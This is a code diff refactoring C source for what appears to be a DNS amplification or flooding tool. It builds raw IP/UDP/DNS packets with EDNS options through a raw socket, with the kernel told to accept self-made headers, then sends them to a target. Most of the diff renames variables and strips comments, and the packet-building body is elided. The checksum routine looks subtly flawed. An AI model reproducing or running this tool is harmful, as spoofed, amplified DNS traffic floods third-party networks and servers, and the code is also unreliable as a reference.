@@ -70,7 +70,7 @@ typedef struct {
     DNS_opt *opt;
 } bomb_t;
 
-/* net stuff */
+/* Functions */
 bomb_t *create_rawsock(bomb_t *);
 bomb_t *stfu_kernel(bomb_t *);
 unsigned short checksum(unsigned short *, int);
@@ -84,45 +84,43 @@ void Implement(int);
 
 
 /* create raw socket */
-bomb_t *create_rawsock(bomb_t *bomb)
+bomb_t *create_rawsock(bomb_t *a)
 {
-    bomb->sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
+    a->sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
 
-    return bomb;
+    return a;
 }
 
 
 /* say STFU to kernel - we set our own headers */
-bomb_t *stfu_kernel(bomb_t *bomb)
+bomb_t *stfu_kernel(bomb_t *a)
 {
-    bomb->one = 1;
+    a->one = 1;
 
-    setsockopt(bomb->sock, IPPROTO_IP, IP_HDRINCL, &bomb->one, 
-                sizeof(bomb->one));
+    setsockopt(a->sock, IPPROTO_IP, IP_HDRINCL, &a->one, sizeof(a->one));
 
-    return bomb;
+    return a;
 }
 
 
-/* checksum for IP and UDP header */
+/* For IP and UDP header */
 unsigned short checksum(unsigned short *addr, int len)
 {
-    u_int32_t cksum  = 0;
-    
+    u_int32_t csum  = 0;
     
     while(len > 0) {
-        cksum += *addr++;
+        csum += *addr++;
         len -= 2;
     }
 
     if(len == 0) {
-        cksum += *(unsigned char *) addr;
+        csum += *(unsigned char *) addr;
     }
     
-    cksum = (cksum >> 16) + (cksum & 0xffff);
-    cksum = cksum + (cksum >> 16);
+    csum = ((csum >> 16) + (csum & 0xffff));
+    csum = (csum + (csum >> 16));
 
-    return (~cksum);
+    return (~csum);
 }
 
 
@@ -249,8 +247,6 @@ bomb_t *build_packet(bomb_t *bomb, int c)
     return bomb;
 }
 
-
-/* fill in sockaddr_in {} */
 bomb_t *fill_sockaddr(bomb_t *bomb)
 {
     bomb->target.sin_family = AF_INET;
@@ -260,28 +256,25 @@ bomb_t *fill_sockaddr(bomb_t *bomb)
     return bomb;
 }
 
-
-/* start action! */
 void Implement(int c)
 {
-    bomb_t *bomb = NULL;
+    bomb_t *b = NULL;
 
     
-    bomb = (bomb_t *) malloc(sizeof(bomb_t));
-    bomb = memset(bomb, 0x00, sizeof(bomb_t));
+    b = (bomb_t *) malloc(sizeof(bomb_t));
+    b = memset(b, 0x00, sizeof(bomb_t));
 
-    bomb = create_rawsock(bomb);
-    bomb = stfu_kernel(bomb);
-    bomb = build_packet(bomb, c);
-    bomb = fill_sockaddr(bomb);
+    b = create_rawsock(b);
+    b = stfu_kernel(b);
+    b = build_packet(b, c);
+    b = fill_sockaddr(b);
 
-    sendto(bomb->sock, bomb->packet, sizeof(struct iphdr) + 
-            sizeof(struct udphdr) + sizeof(DNS_header) + sizeof(DNS_query) + sizeof(DNS_opt)+ strlen(DEFAULT_DOMAIN) + 1, 0, (struct sockaddr *) &bomb->target, 
-            sizeof(bomb->target));
+    sendto(b->sock, b->packet, sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(DNS_header)
+                             + sizeof(DNS_query) + sizeof(DNS_opt)+ strlen(DEFAULT_DOMAIN) + 1, 0, (struct sockaddr *) &b->target, sizeof(b->target));
 
-    close(bomb->sock);
-    free(bomb->packet);
-    free(bomb);
+    close(b->sock);
+    free(b->packet);
+    free(b);
 
     return;
 }
